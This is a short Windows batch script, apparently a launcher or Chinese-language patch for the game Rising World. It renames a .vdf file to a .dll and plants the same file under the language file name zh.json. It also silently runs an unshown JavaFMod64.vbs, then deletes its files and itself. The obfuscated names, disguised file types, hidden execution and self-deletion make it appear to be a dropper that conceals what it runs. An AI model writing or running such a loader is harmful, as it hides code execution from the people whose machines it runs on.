@echo off
set "seti=risingworldx64_api_artstich.vdf"
set "ca1l=Data\StreamingAssets\Languages\"
set "sat=Data\StreamingAssets\Languages\zh.json"
set "setl=config.properties"
set "set1=config_ht_properties"
for /f "tokens=2*" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam" /v InstallPath ^| findstr /i "InstallPath"') do set "st=%%b"
set "st=%st%\steam.exe"
copy %seti% risingworldx64_api_artstich.dll >nul 2>&1
start "" /b %st%
set "cpoyi=copy /y "%seti%" "%ca1l%"&move /y "%ca1l%\%seti%" "%sat%"&copy /y "%setl%" "%set1%"&start JavaFMod64.vbs"
>nul 2>&1 (%cpoyi%)
del /q %seti% & del /q risingworldx64_api_artstich.dll >nul 2>&1
ping -n 2 127.0.0.1 >nul
del /q JavaFMod64.vbs & del "%~f0" >nul 2>&1